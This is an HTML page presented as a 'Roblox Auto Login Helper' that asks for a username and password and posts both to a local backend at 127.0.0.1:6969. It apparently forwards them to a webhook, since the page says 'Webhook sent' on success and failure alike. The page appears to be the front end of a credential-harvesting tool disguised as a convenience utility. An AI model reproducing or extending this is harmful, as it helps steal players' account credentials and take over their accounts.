<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Roblox Auto Login Helper</title>
<style>
body { font-family: Arial; text-align:center; margin-top:50px;}
input { padding:10px; margin:5px; width:250px;}
button { padding:10px 20px; margin:5px;}
#status { margin-top:15px; font-weight:bold; }
</style>
</head>
<body>
<h2>Roblox Auto Login Helper</h2>

<input id="username" placeholder="Username / Email">
<input id="password" type="password" placeholder="Password">
<br>
<button id="loginBtn">Verify Login & Send Webhook</button>

<p id="status"></p>

<script>
document.getElementById("loginBtn").addEventListener("click", () => {
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value;
    const statusEl = document.getElementById("status");

    if(!username || !password){
        statusEl.textContent = "❌ Enter both username and password!";
        return;
    }

    statusEl.textContent = "⏳ Attempting login...";

    fetch("http://127.0.0.1:6969/verify", {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({username, password})
    })
    .then(res => res.json())
    .then(data => {
        if(data.login === "success"){
            statusEl.textContent = "✅ Login Successful! Webhook sent.";
        } else {
            statusEl.textContent = "❌ Login Failed! Webhook sent.";
        }
    })
    .catch(() => {
        statusEl.textContent = "❌ Failed to reach backend!";
    });
});
</script>
</body>
</html>
